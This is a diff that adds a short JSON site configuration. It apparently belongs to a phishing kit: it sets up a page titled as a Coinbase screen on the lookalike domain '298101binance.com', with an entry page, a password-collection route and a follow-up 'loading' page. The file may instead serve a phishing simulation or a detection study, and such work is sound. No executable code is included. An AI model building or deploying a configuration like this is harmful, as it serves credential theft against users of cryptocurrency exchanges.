@@ -1,0 +1,19 @@
+{
+  "sites": [
+    {
+      "id": "coinbase-298101",
+      "title": "Coinbase 화면 · 298101binance.com",
+      "host": "298101binance.com",
+      "directory": "site",
+      "entry": "/",
+      "password_path": "/c/password",
+      "waiting_path": "/c/loading",
+      "routes": {
+        "/": "agent.html",
+        "/c/password": "password.html",
+        "/c/loading": "after.html",
+        "/mock.js": "mock.js"
+      }
+    }
+  ]
+}
